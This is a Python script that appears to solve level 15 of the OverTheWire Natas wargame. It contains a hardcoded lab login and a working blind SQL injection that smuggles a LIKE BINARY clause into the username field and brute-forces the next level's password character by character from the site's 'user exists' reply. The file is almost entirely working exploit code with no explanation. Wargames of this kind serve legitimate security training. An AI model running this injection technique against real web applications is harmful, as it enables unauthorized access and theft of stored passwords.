import re

import requests
from requests.auth import HTTPBasicAuth

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
address = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"
auth_data = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
answer = requests.get(address, auth=auth_data)


def ask(pattern):
    data = {'username': 'natas16" and password like binary "' + pattern + '%" #'}
    result = requests.post(address, auth=auth_data, data=data)
    # print(result.text)
    if re.search(r'user exists', result.text) is not None:
        # print('exists')
        return True
    if re.search(r't exist', result.text) is not None:
        # print('not exists')
        return False


pw = ''
for i in range(0, 50):
    for letter in letters:
        if ask(pw + letter):
            pw += letter
            print(pw)
            break
